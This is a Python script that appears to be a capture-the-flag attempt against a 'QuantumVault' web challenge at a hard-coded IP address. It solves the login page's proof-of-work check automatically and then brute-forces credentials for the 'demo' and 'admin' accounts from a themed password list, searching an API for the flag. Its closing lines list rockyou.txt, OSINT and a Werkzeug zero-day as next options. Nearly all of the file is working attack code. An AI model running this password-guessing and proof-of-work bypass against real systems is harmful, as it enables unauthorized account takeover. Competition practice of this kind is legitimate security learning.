#!/usr/bin/env python3
"""
LAST STAND - Try EVERYTHING we haven't tried
"""

import requests
from bs4 import BeautifulSoup
import hashlib

BASE_URL = "http://138.199.163.92:16969"

def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow(challenge):
    target = 2 ** (256 - 18)
    for nonce in range(500000):
        if int(sha256hex(challenge + str(nonce)), 16) < target:
            return nonce
    return None

def try_login(username, password):
    resp = requests.get(f"{BASE_URL}/login")
    soup = BeautifulSoup(resp.text, 'html.parser')
    challenge = soup.find('input', {'name': 'pow_challenge'})['value']
    nonce = solve_pow(challenge)
    
    if not nonce:
        return False
    
    data = {
        'pow_challenge': challenge,
        'pow_nonce': str(nonce),
        'username': username,
        'password': password
    }
    
    session = requests.Session()
    resp = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    
    if resp.status_code == 302:
        print(f"\n{'='*70}")
        print(f"[!!!] CRACKED: {username}:{password}")
        print(f"{'='*70}")
        
        search = session.get(f"{BASE_URL}/api/search")
        print(f"\n{search.text}")
        
        for q in ['', 'flag', 'Kaal', '*', 'all']:
            r = session.get(f"{BASE_URL}/api/search", params={'q': q})
            if 'Kaal{' in r.text:
                print(f"\n[!!!] FLAG: {r.text}")
        
        return True
    
    return False

print("="*70)
print("LAST STAND - FINAL ATTEMPT")
print("="*70)

# Try VERY specific passwords based on challenge theme
theme_passwords = [
    # Challenge author
    'A$P3R', 'ASPER', 'asper', 'Asper',
    
    # Challenge name variations
    'QuantumVault', 'quantumvault', 'quantum-vault', 'quantum_vault',
    'QuantumVaultIndustries', 'quantumvaultindustries',
    
    # From challenge description
    'unhackable', 'Unhackable', 'UNHACKABLE',
    'unbreakable', 'Unbreakable', 'UNBREAKABLE',
    'overconfident', 'Overconfident', 'OVERCONFIDENT',
    'whistleblower', 'Whistleblower', 'WHISTLEBLOWER',
    'classified', 'Classified', 'CLASSIFIED',
    'government', 'Government', 'GOVERNMENT',
    'contract', 'Contract', 'CONTRACT',
    
    # CTF specific
    'Kaal', 'kaal', 'KAAL',
    'Kaal2026', 'kaal2026',
    'flag', 'Flag', 'FLAG',
    'ctf', 'CTF', 'Ctf',
    
    # Quantum/Crypto themed
    'quantum-resistant', 'quantumresistant',
    'post-quantum', 'postquantum',
    'encryption', 'Encryption', 'ENCRYPTION',
    'crypto', 'Crypto', 'CRYPTO',
    
    # Document management
    'document', 'Document', 'DOCUMENT',
    'documents', 'Documents', 'DOCUMENTS',
    'management', 'Management', 'MANAGEMENT',
    'platform', 'Platform', 'PLATFORM',
    
    # Security buzzwords
    'zero-trust', 'zerotrust',
    'military-grade', 'militarygrade',
    'enterprise', 'Enterprise', 'ENTERPRISE',
    
    # Ironic/Joke passwords (for "overconfident" company)
    'password123!', 'Password123!',
    'Admin123!', 'admin123!',
    'Welcome123!', 'welcome123!',
    'Quantum123!', 'quantum123!',
    
    # Year specific
    '2026', 'Quantum2026', 'Vault2026',
    
    # Simple but missed
    'demo2026!', 'Demo2026!',
    'admin2026!', 'Admin2026!',
]

print(f"\n[*] Trying {len(theme_passwords)} theme-specific passwords...")

for pwd in theme_passwords:
    print(f"  Trying: {pwd}")
    if try_login('demo', pwd):
        exit(0)

print("\n[-] No success with theme passwords")

# Try admin user with same passwords
print("\n[*] Trying admin user...")
for pwd in theme_passwords[:20]:
    print(f"  Trying: {pwd}")
    if try_login('admin', pwd):
        exit(0)

print("\n[*] LAST STAND COMPLETE - NO SUCCESS")
print("\n[!] This challenge requires:")
print("    - A massive wordlist (rockyou.txt with 14M+ passwords)")
print("    - OR finding credentials through OSINT")
print("    - OR exploiting a 0-day in Werkzeug 3.0.1")
print("    - OR there's a hidden hint we haven't found")
